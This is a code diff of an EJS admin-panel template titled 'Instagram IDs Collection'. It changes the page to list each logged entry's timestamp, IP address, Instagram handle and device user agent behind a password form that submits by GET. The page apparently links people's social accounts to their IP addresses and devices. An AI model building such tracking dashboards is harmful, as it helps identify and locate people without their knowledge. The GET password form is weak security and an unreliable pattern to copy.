@@ -4,11 +4,22 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Panel</title>
-    <link rel="stylesheet" href="/style.css">
     <style>
         .admin-container { max-width: 800px; margin: 20px auto; padding: 20px; }
-        .entry { background: #f5f5f5; padding: 10px; margin: 10px 0; border-radius: 5px; }
+        .entry { 
+            background: #f5f5f5; 
+            padding: 15px; 
+            margin: 10px 0; 
+            border-radius: 5px;
+            font-family: monospace;
+        }
         .password-form { margin-bottom: 20px; }
+        .entry-field { margin: 5px 0; }
+        .timestamp { color: #666; font-size: 0.9em; }
+        .ip-address { color: #d00; font-weight: bold; }
+        .instagram-id { color: #09c; }
+        .user-agent { color: #333; }
+        .alert { color: red; }
     </style>
 </head>
 <body>
@@ -16,14 +27,28 @@
         <h1>Instagram IDs Collection 📱</h1>
         <% if (!authenticated) { %>
             <form class="password-form" method="GET">
-                <input type="password" name="password" placeholder="Enter password">
+                <% if (passwordIncorrect) { %>
+                    <p class="alert">Incorrect password!</p>
+                <% } %>
+                <input type="password" name="password" placeholder="Enter password" required>
                 <button type="submit">Login</button>
             </form>
         <% } else { %>
             <div id="entries">
                 <% entries.forEach(entry => { %>
                     <div class="entry">
-                        <%= entry %>
+                        <div class="entry-field timestamp">
+                            <%= new Date(entry.timestamp).toLocaleString() %>
+                        </div>
+                        <div class="entry-field ip-address">
+                            IP: <%= entry.ip %>
+                        </div>
+                        <div class="entry-field instagram-id">
+                            Instagram: @<%= entry.instagramId %>
+                        </div>
+                        <div class="entry-field user-agent">
+                            Device: <%= entry.userAgent %>
+                        </div>
                     </div>
                 <% }); %>
             </div>
